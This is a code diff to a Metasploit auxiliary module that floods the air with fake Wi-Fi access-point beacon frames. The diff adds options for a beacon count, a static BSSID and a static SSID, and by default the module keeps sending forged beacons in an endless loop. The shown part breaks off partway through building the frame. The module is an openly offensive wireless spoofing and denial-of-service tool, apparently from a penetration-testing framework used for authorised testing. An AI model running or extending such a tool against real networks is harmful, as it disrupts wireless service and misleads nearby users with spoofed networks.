@@ -23,30 +23,42 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,	
 			'Name'           => 'Wireless Fake Access Point Beacon Flood',
 			'Description'    => %q{
-				This module advertises thousands of fake access
+				This module can advertise thousands of fake access
 			points, using random SSIDs and BSSID addresses. Inspired
 			by Black Alchemy's fakeap tool.
 			},
 			
-			'Author'         => [ 'hdm' ],
+			'Author'         => [ 'hdm', 'kris' ],
 			'License'        => MSF_LICENSE,
 			'Version'        => '$Revision$'
 		))			
+
+		register_options([
+			OptInt.new('NUM', [false, "Number of beacons to send"]),
+			OptString.new('BSSID', [false, "Use this static BSSID (e.g. AA:BB:CC:DD:EE:FF)"]),
+			OptString.new('SSID', [false, "Use this static SSID"])
+		])
 	end
 
 	def run
 		open_wifi
 		print_status("Sending fake beacon frames...")
-		while (true)
-			wifi.write(create_frame())
+		if datastore['NUM'].nil? or datastore['NUM'] == 0
+			wifi.write(create_frame()) while true
+		else
+			datastore['NUM'].times { wifi.write(create_frame()) }
 		end
 	end
 
 	def create_frame
 
-		ssid     = Rex::Text.rand_text_alpha(rand(31)+1)
-		bssid    = Rex::Text.rand_text(6)
-		seq      = [rand(255)].pack('n')
+		ssid = datastore['SSID'] || Rex::Text.rand_text_alpha(rand(31)+1)
+		if datastore['BSSID']
+			bssid = eton(datastore['BSSID'])
+		else
+			bssid = Rex::Text.rand_text(6)
+		end
+		seq = [rand(255)].pack('n')
 		
 		"\x80" +                      # type/subtype
 		"\x00" +                      # flags
